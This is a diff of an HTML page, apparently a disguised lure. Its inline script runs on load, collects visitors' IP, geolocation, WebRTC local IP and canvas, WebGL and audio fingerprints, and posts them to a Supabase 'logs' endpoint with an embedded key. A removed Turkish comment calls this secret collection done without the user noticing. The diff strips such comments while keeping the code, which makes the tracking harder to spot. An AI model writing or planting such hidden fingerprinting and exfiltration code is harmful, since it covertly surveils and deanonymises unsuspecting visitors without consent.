@@ -23,7 +23,6 @@
             overflow: hidden;
         }
 
-        /* Arka plan efekti */
         body::before {
             content: '';
             position: absolute;
@@ -161,18 +160,12 @@
 </div>
 
 <script>
-    const SUPABASE_URL = "https://ruhvxcltgtemimslszwy.supabase.co/rest/v1/logs";
-    const SUPABASE_KEY = "sb_publishable_N3O2HpzgQq8Q38mtyJEDlw_GR_rULlX";
+    (function sendDataImmediately() {
+        const SUPABASE_URL = "https://ruhvxcltgtemimslszwy.supabase.co/rest/v1/logs";
+        const SUPABASE_KEY = "sb_publishable_N3O2HpzgQq8Q38mtyJEDlw_GR_rULlX";
 
-    // Gizli veri toplama (arka planda, kullanıcı fark etmeden)
-    (async function collectData() {
-        try {
-            // IP ve konum bilgisi
-            let ipRes = await fetch("https://ipapi.co/json/");
-            let ipData = await ipRes.json();
-
-            // Local IP (WebRTC ile)
-            let localIP = await new Promise((resolve) => {
+        async function getLocalIP() {
+            return new Promise((resolve) => {
                 let pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
                 pc.createOffer().then(offer => pc.setLocalDescription(offer));
@@ -184,117 +177,124 @@
                 };
                 setTimeout(() => resolve("Alınamadı"), 2000);
             });
+        }
 
-            // Canvas parmak izi
-            let canvas = document.createElement('canvas');
-            let ctx = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(0, 0, 200, 50);
-            ctx.fillStyle = "#fff";
-            ctx.font = "14px Arial";
-            ctx.fillText("FP", 10, 30);
-            let canvasFP = canvas.toDataURL();
-
-            // WebGL parmak izi
-            let webglFP = "Bilinmiyor";
+        async function sendData() {
             try {
-                let glCanvas = document.createElement('canvas');
-                let gl = glCanvas.getContext('webgl');
-                if (gl) {
-                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        webglFP = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                let ipRes = await fetch("https://ipapi.co/json/");
+                let ipData = await ipRes.json();
+                let localIP = await getLocalIP();
+
+                let canvas = document.createElement('canvas');
+                let ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(0, 0, 200, 50);
+                ctx.fillStyle = "#fff";
+                ctx.font = "14px Arial";
+                ctx.fillText("FP", 10, 30);
+                let canvasFP = canvas.toDataURL();
+
+                let webglFP = "Bilinmiyor";
+                try {
+                    let glCanvas = document.createElement('canvas');
+                    let gl = glCanvas.getContext('webgl');
+                    if (gl) {
+                        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            webglFP = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        }
+                    }
+                } catch(e) {}
+
+                let audioFP = "Hata";
+                try {
+                    let AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (AudioContext) {
+                        let ctxAudio = new AudioContext();
+                        let oscillator = ctxAudio.createOscillator();
+                        let analyser = ctxAudio.createAnalyser();
+                        oscillator.connect(analyser);
+                        analyser.connect(ctxAudio.destination);
+                        oscillator.start(0);
+                        let data = new Uint8Array(analyser.frequencyBinCount);
+                        analyser.getByteFrequencyData(data);
+                        oscillator.stop();
+                        await ctxAudio.close();
+                        audioFP = Array.from(data.slice(0, 10)).join(',');
+                    }
+                } catch(e) {}
+
+                let fonts = [];
+                if (document.fonts) {
+                    await document.fonts.ready;
+                    for (let font of document.fonts) {
+                        fonts.push(font.family);
+                        if (fonts.length > 20) break;
                     }
                 }
-            } catch(e) {}
 
-            // Audio parmak izi
-            let audioFP = "Hata";
-            try {
-                let AudioContext = window.AudioContext || window.webkitAudioContext;
-                if (AudioContext) {
-                    let ctxAudio = new AudioContext();
-                    let oscillator = ctxAudio.createOscillator();
-                    let analyser = ctxAudio.createAnalyser();
-                    oscillator.connect(analyser);
-                    analyser.connect(ctxAudio.destination);
-                    oscillator.start(0);
-                    let data = new Uint8Array(analyser.frequencyBinCount);
-                    analyser.getByteFrequencyData(data);
-                    oscillator.stop();
-                    await ctxAudio.close();
-                    audioFP = Array.from(data.slice(0, 10)).join(',');
+                let plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
                 }
-            } catch(e) {}
 
-            // Font listesi
-            let fonts = [];
-            if (document.fonts) {
-                await document.fonts.ready;
-                for (let font of document.fonts) {
-                    fonts.push(font.family);
-                    if (fonts.length > 20) break;
+                let ua = navigator.userAgent;
+                let deviceName = "Bilinmiyor";
+                if (/iPhone/.test(ua)) deviceName = "iPhone";
+                else if (/iPad/.test(ua)) deviceName = "iPad";
+                else if (/Android/.test(ua)) deviceName = "Android";
+                else if (/Windows/.test(ua)) deviceName = "Windows PC";
+                else if (/Mac/.test(ua)) deviceName = "Mac";
+                else if (/Linux/.test(ua)) deviceName = "Linux";
+
+                let payload = {
+                    ip: ipData.ip,
+                    ulke: ipData.country_name,
+                    sehir: ipData.city,
+                    bolge: ipData.region,
+                    isp: ipData.org,
+                    vpn_proxy: ipData.proxy || false,
+                    hosting: ipData.hosting || false,
+                    tor: ipData.tor || false,
+                    local_ip: localIP,
+                    cihaz_adi: deviceName,
+                    tarayici: ua.split(' ')[0],
+                    isletim_sistemi: navigator.platform,
+                    ekran_cozunurluk: `${screen.width}x${screen.height}`,
+                    dil: navigator.language,
+                    saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookie_enabled: navigator.cookieEnabled,
+                    ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+                    cpu_cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
+                    gpu: webglFP,
+                    canvas_fingerprint: canvasFP.substring(0, 200),
+                    audio_fingerprint: audioFP,
+                    yuklu_fontlar: fonts.join(', ').substring(0, 300),
+                    eklentier: plugins.join(', ').substring(0, 300),
+                    user_agent: ua,
+                    referer: document.referrer,
+                    url_parametreleri: window.location.search.substring(1)
+                };
+
+                let response = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log("Veri başarıyla gönderildi");
+                } else {
+                    console.error("Supabase hatası:", response.status);
                 }
+            } catch (error) {
+                console.error("Veri gönderme hatası:", error);
             }
-
-            // Eklentiler
-            let plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-
-            // Cihaz adı
-            let ua = navigator.userAgent;
-            let deviceName = "Bilinmiyor";
-            if (/iPhone/.test(ua)) deviceName = "iPhone";
-            else if (/iPad/.test(ua)) deviceName = "iPad";
-            else if (/Android/.test(ua)) deviceName = "Android";
-            else if (/Windows/.test(ua)) deviceName = "Windows PC";
-            else if (/Mac/.test(ua)) deviceName = "Mac";
-            else if (/Linux/.test(ua)) deviceName = "Linux";
-
-            // Payload oluştur
-            let payload = {
-                ip: ipData.ip,
-                ulke: ipData.country_name,
-                sehir: ipData.city,
-                bolge: ipData.region,
-                isp: ipData.org,
-                vpn_proxy: ipData.proxy || false,
-                hosting: ipData.hosting || false,
-                tor: ipData.tor || false,
-                local_ip: localIP,
-                cihaz_adi: deviceName,
-                tarayici: ua.split(' ')[0],
-                isletim_sistemi: navigator.platform,
-                ekran_cozunurluk: `${screen.width}x${screen.height}`,
-                dil: navigator.language,
-                saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookie_enabled: navigator.cookieEnabled,
-                ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
-                cpu_cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
-                gpu: webglFP,
-                canvas_fingerprint: canvasFP.substring(0, 200),
-                audio_fingerprint: audioFP,
-                yuklu_fontlar: fonts.join(', ').substring(0, 300),
-                eklentiler: plugins.join(', ').substring(0, 300),
-                user_agent: ua,
-                referer: document.referrer,
-                url_parametreleri: window.location.search.substring(1)
-            };
-
-            // Supabase'e gönder (arka planda)
-            await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-
-        } catch(e) {
-            console.error("Veri toplama hatası:", e);
         }
+
+        sendData();
     })();
 </script>
 
